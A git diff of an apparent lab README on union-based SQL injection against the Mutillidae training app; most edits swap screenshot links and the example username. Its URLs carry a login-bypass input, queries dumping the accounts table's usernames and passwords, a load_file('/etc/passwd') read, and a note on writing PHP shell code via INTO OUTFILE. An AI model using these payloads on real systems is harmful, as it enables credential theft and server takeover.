@@ -41,7 +41,7 @@ Select Multidae from the menu listed as shown above. You will get the page as di
 
 Click on the menu Login/Register and register for an account
 
-![Screenshot 2024-05-07 094019](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/069ff42d-838b-47f5-b9be-6e71e19e25bb)
+![image1](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/821d36b1-afbe-4790-94ab-d1248ab1dcb8)
 
 
 
@@ -124,7 +124,7 @@ Alright. Now is time to test if we managed to fix the database issue. Go ahead a
 
 Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/66174de4-2c3e-4f5b-962a-fb5c0e3af1db)
+![image1](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/7540e22c-2149-4553-90c9-1c00a38f5530)
 
 
 Click the login button and you will see it enter into the administrator page.
@@ -143,8 +143,9 @@ After logging out, Now choose the menu as shown below:
 ![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/16faf4af-a57b-4a9c-a520-0151b5d9517f)
 ![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/1bf8ea0b-5345-4c13-9133-707c5b6a1552)
 ![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/a27e89f2-ac41-4ded-8122-4f487c5f0052)
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/b7c38d3a-767a-44fc-98ea-1f0343f6302b)
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/daa3d0f8-d1c0-4f6a-800a-4536e83d0e32)
+![imag2](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/5d166418-fb52-47ad-97f2-3ef0796dfb89)
+![image2](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/5a733fd0-5e12-4ce5-8af6-9436bdbe2751)
+
 
 
 From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
@@ -169,34 +170,33 @@ http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27
 
 After adding the order by 6 into the existing url , the following error statement will be obtained:
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/6dbebec8-dfb1-4d4e-9c35-ffc6660963ff)
+
 
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/ef87ffd9-02b9-48bd-a57c-e92924a383b8)
+
+
+![img3](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/9ecb4f25-7fb3-4593-9638-b98017cd4071)
+
 
 
  As it is having 5 columns the query worked fine and it provides the correct result
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/7bc6c6d6-ddea-464e-9718-99891e7f1a10)
+![img4](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/e02ff43d-3f6f-4f53-876f-723f05da5e83)
 
 
 
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/fcdcc679-9a35-4fb2-9337-a878f7f3f26a)
-
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/e97e23ce-892b-45be-b534-40cb03cb7106)
-
+![img5](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/bc7d7790-43de-4072-95e7-180e28b7b1c4)
 
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=abinaya%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
-![image](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/8b1d65e5-aa47-498c-85a5-8701729430db)
 
 
 
@@ -207,7 +207,7 @@ Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=userinfo.php&username=abinaya%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
 
 
 
@@ -223,6 +223,7 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 Here we are trying to extract column names from the “accounts” table.
 
 
+![img6](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/bb087fe2-b2e0-4547-a454-46f916052c09)
 
 
 
@@ -230,7 +231,7 @@ Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
+http://192.168.43.145/mutillidae/index.php?page=userinfo.php&username=abinaya%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
 
 
 
@@ -238,8 +239,9 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=abinaya%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
 
+![img7](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/9854894b-6e59-4992-a239-916f6fa0ba84)
 
 
 ## Reading and writing files on the web-server
@@ -249,6 +251,7 @@ Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
 
+![img8](https://github.com/abinayasangeetha/sqlinjection/assets/119393675/c98e0c76-ab7c-4f17-887c-ab8cca6b1b35)
 
 
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
